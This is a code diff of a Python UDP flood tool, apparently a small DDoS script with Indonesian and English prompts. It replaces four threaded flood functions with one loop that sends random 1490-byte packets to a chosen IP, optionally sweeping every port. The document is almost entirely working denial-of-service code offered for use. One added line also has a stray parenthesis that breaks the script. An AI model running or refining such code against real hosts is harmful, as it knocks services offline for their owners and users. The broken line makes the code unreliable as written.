@@ -1,3 +1,21 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+###################################################################################
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+###################################################################################
 ###################################################################################
 # IMPORT MODULE
 import os, sys, socket, threading, random
@@ -6,82 +24,36 @@ import os, sys, socket, threading, random
 def clear():
 	os.system('cls' if os.name=='nt' else 'clear')
 ###################################################################################
+
+os.system("clear")
+os.system("figlet DDos")
+print (" ")
+###################################################################################
 # MAIN MENU 
 clear()
-ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠══>\033[0m "))
-port = int(input("\033[94m╠═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
-choice = str(input("\033[94m╠═══\033[91m[ Attack? y/n ] •\n\033[94m╠══>\033[0m "))
-times = int(input("\033[94m╠═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
-threads = int(input("\033[94m╠═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
+ip = input("\033[94m╔═══\033[91m[ Please input IP ] •\n\033[94m╠══>\033[0m "))
+port = int(input("\033[94m╠═══\033[91m[ Port enter 00000 ] •\n\033[94m╠══>\033[0m "))
+speed = int(input("\033[94m╠═══\033[91m[ Attack speed (0-1000) ] •\n\033[94m╠══>\033[0m "))
 clear()
 print("\033[94m")
 ###################################################################################
-# ATTACK SENT
 
-def attack():
-	data = random._urandom(1025)
-	i = random.choice(("[#]","[!]","[*]","[$]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"Ddos ip > {} port > {} ?!!".format(ip, port))
-		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))
+os.system("clear")
 
-def attack2():
-	data = random._urandom(1800)
-	i = random.choice(("[#]","[!]","[*]","[$]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"Ddos ip > {} port > {} ?!!".format(ip, port))
-		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))
-
-def attack3():
-	data = random._urandom(999)
-	i = random.choice(("[#]","[!]","[*]","[$]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"Ddos ip > {} port > {} ?!!".format(ip, port))
-		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))
-
-def attack4():
-	data = random._urandom(818)
-	i = random.choice(("[#]","[!]","[*]","[$]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +"Ddos ip > {} port > {} ?!!".format(ip, port))
-		except:
-			print("[ Down ] • Request time on ip > {} and port > {}".format(ip, port) %len(lsts))
-
-###################################################################################
-# START DDOS
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = attack)
-		th.start()
-		th = threading.Thread(target = attack2)
-		th.start()
-		th = threading.Thread(target = attack3)
-		th.start
-		th = threading.Thread(target = attack4)
-		th.start
-	elif choice == 'n':
-		print("\033[91m[ Bimzzx ] • CloseTheProgram")
-		pass
+sent = 0
+if port == 00000:
+     port = 1     
+     while True:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          port = port + 1
+          print ("Has been sent %s data packet %s port %d"%(sent,ip,port))
+          time.sleep((1000-speed)/2000)
+          if port == 65535:
+               port = 1
+else:
+     while True:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          print ("Has been sent %s data packet %s port %d"%(sent,ip,port))
+          time.sleep((1000-speed)/2000)
